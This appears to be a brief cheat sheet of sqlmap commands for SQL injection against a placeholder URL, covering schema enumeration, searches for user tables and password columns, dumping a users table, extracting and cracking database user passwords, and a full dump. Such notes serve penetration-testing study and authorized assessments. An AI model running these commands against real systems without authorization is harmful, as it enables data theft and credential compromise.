## DB Schema Enumeration
```shell-session
sqlmap -u "http://www.example.com/?id=1" --schema
```

## Searching for Users
```shell-session
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

## Searching for Passwords
```shell-session
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

## Password Enumeration and Cracking
```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```
- Database = master
- Table = users

## DB Users Password Enumeration and Cracking
```shell-session
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```
- Dumps username passwords for database itself

## Enumerating Everything
```shell-session
sqlmap -u "http://www.example.com/?id=1" --all --batch
```
